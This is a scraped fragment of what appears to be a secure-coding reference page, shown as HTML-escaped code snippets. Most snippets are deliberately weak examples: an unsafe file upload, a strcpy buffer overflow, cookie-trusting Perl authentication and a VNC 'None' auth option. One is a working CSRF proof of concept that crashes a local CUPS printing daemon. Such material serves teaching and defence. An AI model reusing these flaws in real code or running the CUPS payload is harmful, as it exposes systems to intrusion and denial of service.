string single-quoted-string\"\u003e'type'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token keyword\"\u003earray\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'image/pjpeg'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string single-quoted-string\"\u003e'image/jpeg'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'image/png'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string single-quoted-string\"\u003e'image/gif'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"token comment\"\u003e/* fix issue 44. Thanks to Klaus.  */\u003c/span\u003e\n        \u003cspan class=\"token variable\"\u003e$imagewhitelist\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token keyword\"\u003earray\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'jfif'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string single-quoted-string\"\u003e'.png'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string single-quoted-string\"\u003e'.jpg'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string single-quoted-string\"\u003e'.gif'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string single-quoted-string\"\u003e'jpeg'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token operator\"\u003e!\u003c/span\u003e\u003cspan class=\"token function\"\u003ein_array\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token function\"\u003estrtolower\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token function\"\u003esubstr\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$_FILES\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'imagefile'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'name'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token operator\"\u003e-\u003c/span\u003e\u003cspan class=\"token number\"\u003e4\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$imagewhitelist\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n            \u003cspan class=\"token function\"\u003eshow_error\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$lang\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'general'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'upload_failed'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token number\"\u003e1\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"token comment\"\u003e/* end of fix issue 44. Thanks to Klaus.  */\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token operator\"\u003e!\u003c/span\u003e\u003cspan class=\"token function\"\u003ecopy\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$_FILES\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'imagefile'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'tmp_name'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string single-quoted-string\"\u003e'images/'\u003c/span\u003e\u003cspan class=\"token operator\"\u003e.\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$_FILES\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'imagefile'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'name'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n            \u003cspan class=\"token function\"\u003eshow_error\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$lang\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'general'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'upload_failed'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token number\"\u003e1\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003eelse\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"token function\"\u003echmod\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'images/'\u003c/span\u003e\u003cspan class=\"token operator\"\u003e.\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$_FILES\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'imagefile'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'name'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token number\"\u003e0666\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n            \u003cspan class=\"token operator\"\u003e?\u003c/span\u003e\u003cspan class=\"token operator\"\u003e\u003e\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"2e:Tbac,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"token function-definition function\"\u003erunEmployeeQuery\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$dbName\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$name\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token function\"\u003emysql_select_db\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$dbName\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$globalDbHandle\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eor\u003c/span\u003e \u003cspan class=\"token keyword\"\u003edie\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string double-quoted-string\"\u003e\"Could not open Database\"\u003c/span\u003e\u003cspan class=\"token operator\"\u003e.\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$dbName\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token comment\"\u003e//Use a prepared statement to avoid CWE-89\u003c/span\u003e\n    \u003cspan class=\"token variable\"\u003e$preparedStatement\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$globalDbHandle\u003c/span\u003e\u003cspan class=\"token operator\"\u003e-\u003e\u003c/span\u003e\u003cspan class=\"token function\"\u003eprepare\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'SELECT * FROM employees WHERE name = :name'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token variable\"\u003e$preparedStatement\u003c/span\u003e\u003cspan class=\"token operator\"\u003e-\u003e\u003c/span\u003e\u003cspan class=\"token function\"\u003eexecute\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003earray\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e':name'\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003e\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$name\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$preparedStatement\u003c/span\u003e\u003cspan class=\"token operator\"\u003e-\u003e\u003c/span\u003e\u003cspan class=\"token function\"\u003efetchAll\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\u003cspan class=\"token operator\"\u003e...\u003c/span\u003e\n\u003cspan class=\"token variable\"\u003e$employeeRecord\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003erunEmployeeQuery\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'EmployeeDB'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$_GET\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'EmployeeName'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"2f:T9e0,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token keyword\"\u003evoid\u003c/span\u003e \u003cspan class=\"token function\"\u003ehost_lookup\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003echar\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003euser_supplied_addr\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003estruct\u003c/span\u003e \u003cspan class=\"token class-name\"\u003ehostent\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003ehp\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token class-name\"\u003ein_addr_t\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003eaddr\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003echar\u003c/span\u003e hostname\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token number\"\u003e64\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token class-name\"\u003ein_addr_t\u003c/span\u003e \u003cspan class=\"token function\"\u003einet_addr\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003econst\u003c/span\u003e \u003cspan class=\"token keyword\"\u003echar\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003ecp\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\n    \u003cspan class=\"token comment\"\u003e/*routine that ensures user_supplied_addr is in the right format for conversion */\u003c/span\u003e\n\n    \u003cspan class=\"token function\"\u003evalidate_addr_form\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003euser_supplied_addr\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    addr \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003einet_addr\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003euser_supplied_addr\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    hp \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003egethostbyaddr\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eaddr\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token keyword\"\u003esizeof\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003estruct\u003c/span\u003e \u003cspan class=\"token class-name\"\u003ein_addr\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e AF_INET\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token function\"\u003estrcpy\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003ehostname\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e hp\u003cspan class=\"token operator\"\u003e-\u003e\u003c/span\u003eh_name\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"30:T87e,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token operator\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"token operator\"\u003e!\u003c/span\u003e\u003cspan class=\"token operator\"\u003e--\u003c/span\u003e cat cups_dos_poc\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003ehtml  \u003cspan class=\"token operator\"\u003e--\u003c/span\u003e\u003cspan class=\"token operator\"\u003e\u003e\u003c/span\u003e\n\u003cspan class=\"token operator\"\u003e\u0026lt;\u003c/span\u003escript\u003cspan class=\"token operator\"\u003e\u003e\u003c/span\u003e\n\u003cspan class=\"token comment\"\u003e// make 101 CSRFed requests to CUPS daemon via 'img' tags\u003c/span\u003e\n\u003cspan class=\"token comment\"\u003e// causes CUPS daemon to crash\u003c/span\u003e\n\u003cspan class=\"token comment\"\u003e// by Adrian 'pagvac' Pastor | GNUCITIZEN.org\u003c/span\u003e\n\n\u003cspan class=\"token keyword\"\u003efor\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword\"\u003evar\u003c/span\u003e i\u003cspan class=\"token operator\"\u003e=\u003c/span\u003e\u003cspan class=\"token number\"\u003e1\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003ei\u003cspan class=\"token operator\"\u003e\u0026lt;=\u003c/span\u003e\u003cspan class=\"token number\"\u003e101\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\u003cspan class=\"token operator\"\u003e++\u003c/span\u003ei\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    document\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token function\"\u003ewrite\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"\u0026lt;img width=0 height=0 \"\u003c/span\u003e \u003cspan class=\"token operator\"\u003e+\u003c/span\u003e\n        \u003cspan class=\"token string\"\u003e\"src=\\\"http://localhost:631/admin/?OP=add-rss-subscription\u0026amp;SUBSCRIPTION_NAME=DOS_TEST_\"\u003c/span\u003e \u003cspan class=\"token operator\"\u003e+\u003c/span\u003e\n        i \u003cspan class=\"token operator\"\u003e+\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"\u0026amp;PRINTER_URI=%23ALL%23\u0026amp;EVENT_JOB_CREATED=on\u0026amp;MAX_EVENTS=20\\\"\u003e\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"token comment\"\u003e/*\nTESTED ON:\n\nUbuntu 8.04.1 (fully patched as of 19th Oct 2008)\nLinux 2.6.24-21-generic #1 SMP Mon Aug 25 17:32:09 UTC 2008 i686 GNU/Linux\n\nopenSUSE 11.0 (i586)\nLinux 2.6.25.5-1.1-default #1 SMP 2008-06-07 01:55:22 +0200 i686 i686 i386 GNU/Linux\n\nCommon UNIX Printing System 1.3.7\n*/\u003c/span\u003e\n\u003cspan class=\"token operator\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"token operator\"\u003e/\u003c/span\u003escript\u003cspan class=\"token operator\"\u003e\u003e\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"31:Tf12,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token keyword\"\u003emy\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$x\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e new CGI\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$x\u003c/span\u003e\u003cspan class=\"token operator\"\u003e-\u003e\u003c/span\u003ecookie\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e'loggedin'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003ene\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"true\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token operator\"\u003e!\u003c/span\u003eAuthenticateUser\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$x\u003c/span\u003e\u003cspan class=\"token operator\"\u003e-\u003e\u003c/span\u003eparam\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e'username'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$x\u003c/span\u003e\u003cspan class=\"token operator\"\u003e-\u003e\u003c/span\u003eparam\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e'password'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        ExitError\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"Error: you need to log in first\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eelse\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"token comment\"\u003e#Set loggedin and user cookies.\u003c/span\u003e\n        \u003cspan class=\"token variable\"\u003e$x\u003c/span\u003e\u003cspan class=\"token operator\"\u003e-\u003e\u003c/span\u003ecookie\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\n            \u003cspan class=\"token operator\"\u003e-\u003c/span\u003ename \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token operator\"\u003e\u003e\u003c/span\u003e \u003cspan class=\"token string\"\u003e'loggedin'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\n            \u003cspan class=\"token operator\"\u003e-\u003c/span\u003evalue \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token operator\"\u003e\u003e\u003c/span\u003e \u003cspan class=\"token string\"\u003e'true'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\n        \u003cspan class=\"token variable\"\u003e$x\u003c/span\u003e\u003cspan class=\"token operator\"\u003e-\u003e\u003c/span\u003ecookie\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\n            \u003cspan class=\"token operator\"\u003e-\u003c/span\u003ename \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token operator\"\u003e\u003e\u003c/span\u003e \u003cspan class=\"token string\"\u003e'user'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\n            \u003cspan class=\"token operator\"\u003e-\u003c/span\u003evalue \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token operator\"\u003e\u003e\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$x\u003c/span\u003e\u003cspan class=\"token operator\"\u003e-\u003e\u003c/span\u003eparam\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e'username'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$x\u003c/span\u003e\u003cspan class=\"token operator\"\u003e-\u003e\u003c/span\u003ecookie\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e'user'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003eeq\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"Administrator\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    DoAdministratorTasks\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"32:T496,def check_version(self, version):\n    \"\"\"\n    Determine the client's version and decide whether to continue the\n    handshake.\n    \"\"\"\n\n    if version == self.VERSION:\n        log.msg(\"Client version %s is valid\" % version.strip())\n        # Hardcoded: 2 security types: None and VNC Auth.\n        self.transport.write(\"\\x02\\x01\\x02\")\n        # Hardcoded: 1 security type: VNC Auth.\n        self.transport.write(\"\\x01\\x02\")\n        return self.select_security_type, 1\n    else:\n        log.err(\"Can't handle VNC version %r\" % version)\n        self.transport.loseConnection()\n\ndef select_security_type(self, security_type):\n    \"\"\"\n    Choose the security type that the client wants.\n    \"\"\"\n    security_type = ord(security_type)\n    if security_type == 2:\n        # VNC authentication. Issue our challenge.\n        self.challenge = urandom(16)\n        self.transport.write(self.challenge)\n\n        return self.vnc_authentication_result, 16\n    elif security_type == 1:\n        # No authentication. Just move to the SecurityResult.\n        self.authenticated()\n    else:\n        log.err(\"Couldn't agree on an authentication scheme!\")\n        self.transport.loseConnection()\n33:T1283,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token keyword\"\u003edef\u003c/span\u003e \u003cspan class=\"token function\"\u003echeck_version\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eself\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e version\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n    \u003cspan class=\"token triple-quoted-string string\"\u003e\"\"\"\n    Determine the client's version and decide whether to continue the\n    handshake.\n    \"\"\"\u003c/span\u003e\n\n    \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e version \u003cspan class=\"token operator\"\u003e==\u003c/span\u003e self\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eVERSION\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n        log\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003emsg\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"Client version %s is valid\"\u003c/span\u003e \u003cspan class=\"token operator\"\u003e%\u003c/span\u003e version\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003estrip\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"token comment\"\u003e# Hardcoded: 2 security types: None and VNC Auth.\u003c/span\u003e\n        self\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003etransport\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003ewrite\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"\\x02\\x01\\x02\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"token comment\"\u003e# Hardcoded: 1 security type: VNC Auth.\u003c/span\u003e\n        self\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003etransport\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003ewrite\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"\\x01\\x02\"\u003c/span\u003e\u003cspan class=\"token 